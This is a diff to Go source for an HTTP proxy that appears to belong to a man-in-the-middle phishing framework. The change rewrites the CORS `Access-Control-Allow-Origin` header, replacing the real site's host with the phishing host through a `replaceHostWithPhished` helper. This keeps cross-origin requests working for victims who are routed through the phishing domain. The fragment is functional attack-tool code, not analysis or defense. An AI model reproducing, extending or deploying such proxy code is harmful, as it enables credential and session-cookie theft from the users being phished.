@@ -607,17 +607,14 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 			allow_origin := resp.Header.Get("Access-Control-Allow-Origin")
 			if allow_origin != "" && allow_origin != "*" {
-				origin_from_request := resp.Request.Header.Get("Origin")
-				if origin_from_request != "" {
-					scheme_origin := strings.Split(origin_from_request, "//")
-					r_origin, ok := p.replaceHostWithPhished(scheme_origin[1])
-					if ok {
-						scheme := scheme_origin[0]
-						final_url := scheme + "//" + r_origin
-						resp.Header.Set("Access-Control-Allow-Origin", final_url)
-					} else {
-						log.Important("Unable to translate %s, in the Access-Control-Allow-Origin header. Leaving it as it is.", origin_from_request)
-					}
+				scheme_origin := strings.Split(allow_origin, "//")
+				r_origin, ok := p.replaceHostWithPhished(scheme_origin[1])
+				if ok {
+					scheme := scheme_origin[0]
+					final_url := scheme + "//" + r_origin
+					resp.Header.Set("Access-Control-Allow-Origin", final_url)
+				} else {
+					log.Important("Unable to translate %s, in the Access-Control-Allow-Origin header. Leaving it as it is.", allow_origin)
 				}
 			}
 			var rm_headers = []string{
